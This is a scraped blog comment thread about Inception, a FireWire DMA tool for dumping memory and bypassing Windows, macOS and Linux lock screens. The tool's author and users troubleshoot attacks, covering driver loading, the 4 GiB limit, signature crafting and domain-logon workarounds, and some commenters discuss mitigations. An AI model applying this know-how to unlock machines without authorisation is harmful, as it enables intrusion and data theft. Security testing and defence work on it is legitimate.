<p>However, I was unfortunately unable to use this software to actually extract a password or disable the unlock screen. Is there anything that I can do to help make a signature that works with OS X 10.7/10.8?</p>
<p>Also, it would be great if the tool was capable of either writing to a custom file location or even Stdout. When using a LiveCD with no persistence, RAM dumps are very space-expensive, so being able to write to an external device or a FIFO or something can be useful.</p>
<time datetime="2012-03-27"><a href="http://www.breaknenter.org/projects/inception/#comment-1162">March 27th, 2012 </a></time>

<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>Aha – you’re using an old version of the tool – that offset is from the experimental signatures that were replaced some time ago. Do a <code>git pull</code> and try again.</p>
<p>Let me know if that doesn’t solve your problems. A word of advice if you are attacking in the field: Ubuntu loads its kernel at high physical memory addresses. Depending on the physical memory size and layout of the target (if the machine has a dedicated graphics card, etc.) you may experience inability to read memory content over the 2/4 GiB mark. If the kernel is loaded above this mark, the unlock won’t work. Memory dumping will still work fine, though.</p>
<p>Lycka till ;-)</p>
<time datetime="2012-04-17"><a href="http://www.breaknenter.org/projects/inception/#comment-1202">April 17th, 2012 </a></time>
</div>
</div>

<li class="comment byuser comment-author-carmaa bypostauthor even depth-2">
<article class="clearfix" id="comment-1217">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>Correct. As your university PC probably authenticates against a central domain controller, the trick of allowing local blank passwords won’t work (you don’t have control over the DC password checking functionality). I’m currently considering migrating the Windows signatures to patch the local function that decides if accounts needs to authenticate at all, which would probably fix domain logons as well. This is a future improvement, and not implemented at the moment.</p>
<p>Depending on the state of the domain PC you are trying to hack, you may be able to log in locally (i.e., “Log into computer XXXX”) instead of logging into the domain. You could also try to disconnect the PC from the network before trying to log in.</p>
<p>Also, depending on the legislation where you live, hacking your university’s property may be punishable by law. I would suggest testing this in a simulated environment rather than having a go at public computers, unless of course you have permission to do so.</p>
<time datetime="2012-04-22"><a href="http://www.breaknenter.org/projects/inception/#comment-1217">April 22nd, 2012 </a></time>
<a aria-label="Reply to Carsten" class="comment-reply-link" href="/projects/inception/?replytocom=1217#respond" onclick='return addComment.moveForm( "comment-1217", "1217", "respond", "537" )'>Reply</a> </div>
</div>

<div class="span10 comment-text">
<h4>Bill</h4>
<p>FYI, the “fast user switching” exposure was addressed in 10.7.2 (see CVE-2011-3215 on <a href="http://support.apple.com/kb/HT5002" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'http://support.apple.com/kb/HT5002', 'http://support.apple.com/kb/HT5002']);" rel="nofollow">http://support.apple.com/kb/HT5002</a>).  It is no longer possible to perform DMA at any state except while logged in, on or after 10.7.2.</p>
<time datetime="2012-04-29"><a href="http://www.breaknenter.org/projects/inception/#comment-1240">April 29th, 2012 </a></time>

<h4>goldfish</h4>
<p>Ah, I understood libforensics were replacement drivers. My bad.<br/>

<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>And did you try to reboot the host system as I suggested above? I understand that you attack from a live CD and that you’ll have to reinstall Inception, but as you seem to have loaded/unloaded quite a few FireWire modules that may be the source of the problem.</p>
<p>Also, if you are using a FireWire expansion card on the host side, make sure you keep this plugged in while rebooting. Ubuntu’s support for hotplugging is not really stable.</p>
<time datetime="2012-05-13"><a href="http://www.breaknenter.org/projects/inception/#comment-1328">May 13th, 2012 </a></time>

<li class="comment byuser comment-author-carmaa bypostauthor odd alt depth-2">
<article class="clearfix" id="comment-1621">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>BackTrack doesn’t load FireWire drivers when you hotplug a device into the machine.</p>
<p>Issue the following command:</p>
<p><code>modprobe firewire-ohci firewire-sbp2</code></p>
<p>in the terminal on your BT machine to load the drivers on the victim side into the kernel. Because of this, BT is also not vulnerable to the attack by default. Good on the people that configured BT – secure defaults is a good thing.</p>
<p>If you still are having trouble, verify that the cable and interfaces actually work by connecting a real FW device (such as a hard drive) to both the victim and the host, using the same cable.</p>
<time datetime="2012-06-14"><a href="http://www.breaknenter.org/projects/inception/#comment-1621">June 14th, 2012 </a></time>
<a aria-label="Reply to Carsten" class="comment-reply-link" href="/projects/inception/?replytocom=1621#respond" onclick='return addComment.moveForm( "comment-1621", "1621", "respond", "537" )'>Reply</a> </div>
</div>

<li class="comment byuser comment-author-carmaa bypostauthor odd alt depth-2">
<article class="clearfix" id="comment-1809">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>I’ve experimented with the iPod option itself, the problem is that the iPodLinux (<a href="http://en.wikipedia.org/wiki/IPodLinux" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'http://en.wikipedia.org/wiki/IPodLinux', 'http://en.wikipedia.org/wiki/IPodLinux']);" rel="nofollow">http://en.wikipedia.org/wiki/IPodLinux</a> / <a href="http://ipodlinuxinstl.sourceforge.net/" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'http://ipodlinuxinstl.sourceforge.net/', 'http://ipodlinuxinstl.sourceforge.net/']);" rel="nofollow">http://ipodlinuxinstl.sourceforge.net/</a>) project is not that active anymore, it relies on the old linux firewire stack, and that 1-3G iPods with firewire are not easy to come by. The best I can do is to urge you to read the documentation on the iPodLinux site.</p>
<p>Inception will not work on an iPod as it uses the new Linux JuJu FireWire stack (introduced in the 2.6.31 Linux kernel). You would have to use winlockpwn.</p>
<time datetime="2012-07-3"><a href="http://www.breaknenter.org/projects/inception/#comment-1809">July 3rd, 2012 </a></time>

<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>Not really easy to say what this could be, I’ve never experienced this myself. I haven’t tested Inception with BT5R3 yet, so have that in mind.</p>
<p>This sounds like an error on the host side of the connection. Have you tried to recompile and reinstall the libforensic1394 libraries? I would also have a look at what the command dmesg outputs before and after you plug/unplug the cable.</p>
<p>I would also test that the FireWire interfaces on both sides (host and victim) still works. Good luck!</p>

<article class="clearfix" id="comment-3236">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>The 4 GiB limit is not imposed by Inception, but by the fact that FireWire uses 32-bit addressing. There’s no way of getting around that limit using FireWire, unfortunately.</p>
<time datetime="2012-10-31"><a href="http://www.breaknenter.org/projects/inception/#comment-3236">October 31st, 2012 </a></time>
<a aria-label="Reply to Carsten" class="comment-reply-link" href="/projects/inception/?replytocom=3236#respond" onclick='return addComment.moveForm( "comment-3236", "3236", "respond", "537" )'>Reply</a> </div>

<li class="comment byuser comment-author-carmaa bypostauthor odd alt depth-2">
<article class="clearfix" id="comment-3344">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>See the troubleshooting section above.</p>
<p>The DLLs that Inception patches in-memory may be located above 4 GiB in RAM, which is not accessible to FireWire. This is a known issue with x64 Windows 7 and up machines.</p>
<p>If you want to test you could remove one of the memory modules and re-test with only 4 GiB of RAM.</p>
<time datetime="2012-11-14"><a href="http://www.breaknenter.org/projects/inception/#comment-3344">November 14th, 2012 </a></time>
<a aria-label="Reply to Carsten" class="comment-reply-link" href="/projects/inception/?replytocom=3344#respond" onclick='return addComment.moveForm( "comment-3344", "3344", "respond", "537" )'>Reply</a> </div>

<article class="clearfix" id="comment-5820">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/df56ab993e323913cee820044c188574?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4>Fabi</h4>
<p>Quick question from a newbie: Would it also be possible to search for a file path in RAM and replace it with another file path? If yes, how would that work and could I do it using your -m switch?</p>
<time datetime="2013-01-8"><a href="http://www.breaknenter.org/projects/inception/#comment-5820">January 8th, 2013 </a></time>
<a aria-label="Reply to Fabi" class="comment-reply-link" href="/projects/inception/?replytocom=5820#respond" onclick='return addComment.moveForm( "comment-5820", "5820", "respond", "537" )'>Reply</a> </div>

<ul class="children">
<li class="comment byuser comment-author-carmaa bypostauthor odd alt depth-2">
<article class="clearfix" id="comment-5822">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>You can search for anything that is loaded in memory. File paths may be loaded at different offsets within pages between re-boots, so you may have trouble locating them reliably without doing a sequential search, which will likely yield a lot of false positives. If the file path is hardcoded in a binary, it will be loaded at the same offset within a memory page each time, which will make it easier to locate it. That’s the way Inception works – it searches for signatures at pre-determined offsets within the memory pages.</p>
<p>Take a look at inception/cfg.py for more on the way the signatures are structured.</p>
<time datetime="2013-01-8"><a href="http://www.breaknenter.org/projects/inception/#comment-5822">January 8th, 2013 </a></time>
<a aria-label="Reply to Carsten" class="comment-reply-link" href="/projects/inception/?replytocom=5822#respond" onclick='return addComment.moveForm( "comment-5822", "5822", "respond", "537" )'>Reply</a> </div>
</div>

<div class="span10 comment-text">
<h4><a class="url" href="http://www.ernw.de" rel="external nofollow">Felix</a></h4>
<p>Hi Carsten,<br/>
The version of libforensic1394 linked in your install instructions misses an important bugfix for the Python API: <a href="https://gitweb.freddie.witherden.org/?p=forensic1394.git;a=commit;h=b43eff4da98ce99f811c5d88d4c30d696f58bdbf" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'https://gitweb.freddie.witherden.org/?p=forensic1394.git;a=commit;h=b43eff4da98ce99f811c5d88d4c30d696f58bdbf', 'https://gitweb.freddie.witherden.org/?p=forensic1394.git;a=commit;h=b43eff4da98ce99f811c5d88d4c30d696f58bdbf']);" rel="nofollow">https://gitweb.freddie.witherden.org/?p=forensic1394.git;a=commit;h=b43eff4da98ce99f811c5d88d4c30d696f58bdbf</a> </p>
<p>Without this patch, error checking for the read_device_v method is disabled, leading to silent failures when the firewire connection is interrupted.</p>
<time datetime="2013-01-9"><a href="http://www.breaknenter.org/projects/inception/#comment-5864">January 9th, 2013 </a></time>

<li class="comment byuser comment-author-carmaa bypostauthor even depth-2">
<article class="clearfix" id="comment-6251">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>You won’t be able to predict where it is placed in memory – but you can predict where within a single memory page certain parts of the code is loaded. To generate signatures for Inception you’ll have to reverse engineer the binary of the function you want to locate – e.g. the binary containing pam_authenticate() – and find the offset of the code you want to change.</p>
<time datetime="2013-01-24"><a href="http://www.breaknenter.org/projects/inception/#comment-6251">January 24th, 2013 </a></time>
<a aria-label="Reply to Carsten" class="comment-reply-link" href="/projects/inception/?replytocom=6251#respond" onclick='return addComment.moveForm( "comment-6251", "6251", "respond", "537" )'>Reply</a> </div>

<li class="comment even thread-odd thread-alt depth-1">
<article class="clearfix" id="comment-10590">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://0.gravatar.com/avatar/09f1cfb4043d3e5ba5db0a2b395ee071?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4>Ruslan</h4>
<p>Hello everyone.<br/>
First of all thanks to Carsten for the great tool.<br/>
The main reason of my post is addressed to the people, having troubles with “no firewire device found”.<br/>
I have experimented with the tool long enough and found following:<br/>
If you have fw in lspci, if you have firewire_ohci, firewire_spb2 in lsdev and still have no firewire device found – change the cable. 95% is a cable trouble, even if it worked just a day before. It sounds strange, but I have tripple-checked that fact, using several cables, connecting to three different PC’s with different fw cards – and I’m sure. The first my cable worked just fine for a week or so, but one day tool stops working, giving the annoying error. I have killed about four days, inspecting all kind of software reasons, cuz I thought it’s not a hardware. Then, at last I have tryed to change the cable – and it works for couple of times. It was a sad surprise, when the new cable stops working again. I have buyed three different cables and at last found the one, which works perfect. So, if you expecting troubles i suggest the very first thing – if you have possibility to use 6-pin to 6-pin cable – make or buy the 6-pin cable with only 4 pins connected: 3 to 5, 5 to 3, 4 to 6, and 6 to 4. 1 and 2 should not be connected. This is the only cable, that always works. Sorry for possible mistakes, i’m not native english speaker.</p>
<time datetime="2013-08-4"><a href="http://www.breaknenter.org/projects/inception/#comment-10590">August 4th, 2013 </a></time>
<a aria-label="Reply to Ruslan" class="comment-reply-link" href="/projects/inception/?replytocom=10590#respond" onclick='return addComment.moveForm( "comment-10590", "10590", "respond", "537" )'>Reply</a> </div>
</div>
</article>

<article class="clearfix" id="comment-19118">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://0.gravatar.com/avatar/227c334d8197b8c8df207e58d1e4f41a?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4>Kurt H Hanssen</h4>
<p>Hi Carsten<br/>
Talk with you today about issues with Macbook Air and Macbook Pro from 2012 and newer.</p>
<p>Have tested the Inception against a whole bunch of Macbook Air/Pro, old one and new. When i came to machines newer than mid 2012, it is not possible to read anything from the memory at the target machine. Have tried both the patching method and the –pickpocket.</p>
<p>As an attacker machine, i have tried both Ubuntu 12.10 installed on PC and Mac (not using virtualization).</p>
<p>The newer Macbook Air/Pro only have Thunderbolt, but I’m using the original Apple Thunderbolt –&gt; Firewire adapter.</p>
<p>Have success on attacking an 2011 Macbook Air trough Thunderbolt w/adapter but not two different MB Air from 2012 and 2013 and a MB pro from mid 2012.</p>
<p>On all target machines, the juju firewire stack shows up, even on the newer MB pro/Air, so, i know the machine is recognized. They are also recognized by Inception as Apple computers</p>
<p>I think there must be some sort of shield on the newer MB pro/air.</p>
<p>Have even tried to shadow the attacker machine behind a Thuderbolt disk, but with  same result,<br/>
forensic1394_read_device_v: I/O Timeout</p>
<p>Have also tried the forensic1394 libraries manually trough Python3, and these machines are all identified, possible to attach but no reading. I thin i had one success on reading just a few kilobytes with some tweaking on start/length.</p>
<time datetime="2014-02-3"><a href="http://www.breaknenter.org/projects/inception/#comment-19118">February 3rd, 2014 </a></time>

<li class="comment odd alt thread-odd thread-alt depth-1">
<article class="clearfix" id="comment-25242">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/93aa9068838a92f95aa0a5794e359323?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://faircash.org/" rel="external nofollow">Heinz Kreft</a></h4>
<p>Hi Carsten,<br/>
Your Inception tool is a great proof of concept how difficult it would be to establish a good protection for unsafe platforms and is also an excellent demonstration of your personal capabilities …</p>
<p>My reason here is to put an idea on the table I’ve had a long time im my head and so far I do not found such a thing on the Internet. I would like to ask you and the people here what do they thing about it. </p>
<p>I called this currently not existing tool “ICT RipCord”. It should help to make PC’s a little bit safer against DMA &amp; Cold Boot Attacks in the following way:</p>
<p>A small system service on the PC (e.g. Windows, OSX) and an APP on a Smartphone (IOS, Android) work together as a “dead man switch”. They establish a VPC using (at install time) selfgenerated root certificates (no dependence from any third party) using Perfect Forward Secrecy (OTP session keys established by the Diffie-Hellmann-Protocol (DHP)). This channel is then used for a simple “ping-pong protocol” to make sure that everything is ok. If the so protected PC is not able to get a valid answer  within a preset timeframe, the PC fails safe: Service stopps the system, (optional) zeros the RAM and force the PC to go down (forgetting the effected memory keys).</p>
<p>This can limit the timeframe for an attacker having physical control over the PC-Victim to capture the key in memory.</p>
<p>If the owner of the authentication token (the Smartphone with the auth-APP) detects his PC stolen, under attach or even forgotten to be switched off, he simply turns off the authentication service. There is no big issue, if this tool downs the PC in the case the network goes down because the legal owner of the PC is in general able to enter the key of the previously installed full disk encryption system.</p>
<p>I am interessed to hear pros and cons about this.<br/>
Thanks a lot,</p>
<p>Heinz</p>

<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://0.gravatar.com/avatar/c56f4c7a613cac7565ead775e9dae6a7?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://url.com" rel="external nofollow">Andy</a></h4>
<p>Hey, this tool really is cool :-)<br/>
I will use this tool to silence some of the loud-mouthed guys here claiming that encrypting a PC without activating PBA is enough security …</p>
<p>Something I noticed: Using Ubuntu 12.4 LTS with all required stuff added to attack a McAfee EEPC-encrypted Win7-64 Enterprise system. </p>
<p>Attack works fine for the first attempt (PBA is passed, Win7 boots up, user logs in the regular way, screen is locked), unlock the screen is possible w/o password.<br/>
When in this same session the screen then is locked again using WIN-L, the next attack fails (at around 29xx MiB – system has 4GB) with some firewire I/O error.</p>
<p>Any specific reason for that ?</p>
<p>After the system has been rebooted and a user logs in the regular way, and then locks the screen, the attack works again. Not really an issue, as one would expect an attacker to NOT lock the screen :-)<br/>
Ony, assuming that the screen saver hits during e.g. copying the data off the attacked PC, it can’t be unlocked again, which can be annoying. (no, one can’t disable the screen saver, if the settings are done via GPO).</p>
<p>Thanks,<br/>
Andy</p>

<li class="comment odd alt thread-odd thread-alt depth-1">
<article class="clearfix" id="comment-25267">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://0.gravatar.com/avatar/c56f4c7a613cac7565ead775e9dae6a7?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://url.com" rel="external nofollow">Andy</a></h4>
<p>Hi Carsten,</p>
<p>(somehow the sort order of this posts is screwed up ?! It’s not ordered by date …)</p>
<p>to protect a PC, one needs to know what a potential attacker needs to know of have, so: As I understood this tool, to log on to the victim PC (assuming a Windows system to be attacked), always an existing and valid local user account is required ?! </p>
<p>I tried the following (all on Win7-64 as victim, joined into an AD domain):<br/>
– System booted and domain account logged in, screen locked, network connected: Works, can unlock w/o password.<br/>
– Same system, screen locked again: Won’t work, Firewire I/O error !<br/>
– System booted, but nobody logged on, using the last logged-on domain account, network connected: Nope, no way !<br/>
Tool says OK, but can’t log on. Seems the code to verify a domain account is not patched.<br/>
– System booted, nobody logged on, using the last logged-on domain account, NO network connected: Works, can log on w/o password.<br/>
– Same system, user logged off, same user logged on again: Still works, can log on again, no need to re-run the tool.<br/>
– System booted, nobody logged on, using arbitrary local account: No way, unknow user!</p>
<p>That means: A potential attacker always needs to know a valid local computer account (or a valid domain account that has cached credentials) on the victim. If the local administrator is renamed (or disabled and/or no local user is know or does exist – any idea here ?), it is impossible to log on. If the last logged-on user it not displayed and no user is known – impossible to log on (after using Inception). </p>
<p>To achieve this, windows can be set to not display the last logged-on, and the local accounts can be renamed or deleted/disabled.</p>
<p>I therefore would say: If an attacker has no clue which account is valid to log on, there’s no way to get in ?!<br/>
Anybody disagrees ? Did I miss anything ?</p>
<p>Is there a way to locate a valid user account / cached credentials in the memory dump without knowing it before ?</p>
<p>(Carsten, let me know if you want some more things tested …)</p>
<p>Regards,<br/>
Andy</p>
<time datetime="2014-03-18"><a href="http://www.breaknenter.org/projects/inception/#comment-25267">March 18th, 2014 </a></time>

<article class="clearfix" id="comment-71474">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://0.gravatar.com/avatar/4b8a0b7afe2864d4d97cb98d99399a80?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.foo.bar" rel="external nofollow">Curious User</a></h4>
<p>Hey Carsten,</p>
<p>I haven’t tried your tool yet but am very curious on how to mitigate such an attack. Maybe you can help me with the following questions:</p>
<p>1) From what I understand a DMA attack *always* needs driver support from the OS. So prohibiting the installation of SBP2 devices via Windows Group Policies should be enough to prevent an inception as well as reading encryption keys from memory? There is no way to access memory without the OS actively allowing it?</p>
<p>2) As far as I know, since Windows 8.1 SBP2 device drivers are only installed if a user is interactively logged on to the system. So running the attack on a locked workstation will not succeed.</p>
<p>3) Does this type of attack only apply to FireWire (i.e. SBP2) or would it theoretically be possible to develop a PCIe device that simply dumps memory contents to some external storage?</p>
<p>4) Does Bitlocker detect the insertion of pcmcia or PCIe cards or the removal of RAM at boot time? A way to overcome the 4GB barrier could be to simply remove the additional RAM and thus force the OS to use the lower address space.</p>
<p>Best regards,<br/>
Klayman</p>

Any tool that can search bitlocker recovery key in the  memory dump? (for win 8.1 ,64 bit) Thx</p>
